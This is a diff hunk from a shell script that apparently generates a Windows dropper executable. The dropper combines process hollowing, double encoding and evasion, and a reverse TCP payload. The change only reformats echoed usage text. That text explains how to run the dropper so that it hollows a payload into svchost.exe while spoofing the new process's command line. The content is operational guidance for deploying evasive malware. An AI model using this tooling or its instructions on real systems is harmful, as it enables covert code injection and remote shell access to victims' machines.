@@ -155,20 +155,20 @@ printf "\n Generated dropper executable output/hollowing_targetfromcmd_doubleenc
 cleanup_techniques
 
 echo "
-# Usage example of generated hollowing_targetfromcmd_doubleenc_doubleev_revtcp_win32.exe:\n
-#\n
-# hollowing_targetfromcmd_doubleenc_doubleev_revtcp_win32.exe first second C:\windows\system32\svchost.exe,C:\i\spoofed\this.exe\n
-#\n
-# The first and second command line parameters can be arbitrary strings, as they are not used. We just need the third command line parameter.\n
-# The format of the third parameter is expected to be as follows:	<process to hollow into>,<desired command line of new process>\n
-# So you need to specify two values, separated by a comma delimiter.\n
-#\n
-# <process to hollow into>:\n
-# Path to the executable image of your hollowing target. Based on this image, A NEW PROCESS WILL BE CREATED and your actual payload hollowed into it.\n
-#\n
-# <parent command line of new process>:\n
-# Specifies the command line of the newly created process. This will be passed internally as an argument for CreateProcess.\n
-# So you can basically spoof the command line of your hollowing target here.\n
-#\n
-# !!!\n
+# Usage example of generated hollowing_targetfromcmd_doubleenc_doubleev_revtcp_win32.exe:
+#
+# hollowing_targetfromcmd_doubleenc_doubleev_revtcp_win32.exe first second C:\windows\system32\svchost.exe,C:\i\spoofed\this.exe
+#
+# The first and second command line parameters can be arbitrary strings, as they are not used. We just need the third command line parameter.
+# The format of the third parameter is expected to be as follows:	<process to hollow into>,<desired command line of new process>
+# So you need to specify two values, separated by a comma delimiter.
+#
+# <process to hollow into>:
+# Path to the executable image of your hollowing target. Based on this image, A NEW PROCESS WILL BE CREATED and your actual payload hollowed into it.
+#
+# <parent command line of new process>:
+# Specifies the command line of the newly created process. This will be passed internally as an argument for CreateProcess.
+# So you can basically spoof the command line of your hollowing target here.
+#
+# !!!
 # You are expected to keep the required format and specify all above mentioned parameters. Otherwise the program will probably crash (Who properly validates input anyway? The user always knows best ;))."
